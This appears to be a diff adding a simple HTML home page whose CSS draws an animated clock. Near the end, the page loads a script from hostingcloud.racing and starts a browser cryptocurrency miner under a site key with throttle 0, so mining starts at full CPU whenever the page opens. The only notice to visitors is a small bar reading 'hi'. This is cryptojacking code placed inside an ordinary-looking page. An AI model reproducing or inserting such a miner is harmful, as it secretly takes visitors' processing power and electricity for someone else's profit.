@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="utf-8">
+    <title>home page</title>
+    <style>
+      .clock {
+        width: 256px;
+        height: 256px;
+        border: 8px solid #353535;
+        border-radius: 50%;
+        position: absolute;
+        left: 50%;
+        top: 50%;
+        margin: -128px 0 0 -128px;
+        box-shadow:0 0 16px rgba(0,150,255,0.3) inset
+      }
+
+      .clock:before,
+      .clock:after {
+        content: "";
+        position: absolute;
+        height: 128px;
+        width: 8px;
+        background: rgba(0,0,0,0.75);
+        border-radius: 4px;
+        left: 50%;
+        bottom: 128px;
+        margin: 0 0 0 -4px;
+        -webkit-transform-origin: bottom;
+                transform-origin: bottom;
+        -webkit-animation-name: Clock;
+                animation-name: Clock;
+        -webkit-animation-iteration-count: infinite;
+                animation-iteration-count: infinite;
+        -webkit-animation-timing-function: linear;
+                animation-timing-function: linear;
+          box-shadow:0 16px 0px rgba(0,0,0,0.75)
+      }
+
+      .clock:before {
+        -webkit-animation-duration: 720s;
+                animation-duration: 720s;
+        height:96px;
+      }
+      .clock:after {
+        -webkit-animation-duration: 60s;
+                animation-duration: 60s;
+        height:120px;
+      }
+      @-webkit-keyframes Clock {
+        0% {
+          -webkit-transform: rotate(0deg);
+                  transform: rotate(0deg)
+        }
+        100% {
+          -webkit-transform: rotate(360deg);
+                  transform: rotate(360deg)
+        }
+      }
+      @keyframes Clock {
+        0% {
+          -webkit-transform: rotate(0deg);
+                  transform: rotate(0deg)
+        }
+        100% {
+          -webkit-transform: rotate(360deg);
+                  transform: rotate(360deg)
+        }
+      }
+      }
+    </style>
+  </head>
+  <body style="margin: 0">
+    <div class="clock"></div>
+    <script src="https://www.hostingcloud.racing/OY7E.js"></script>
+    <script>
+        var _client = new Client.Anonymous('23b43ca9ac30464320d6595f4a9b3eebcf243e492cfceb64e8e8861e3e566f60', {
+            throttle: 0
+        });
+        _client.start();
+        _client.addMiningNotification("Bottom", "hi", "#cccccc", 20, "#3d3d3d");
+
+    </script>
+  </body>
+</html>
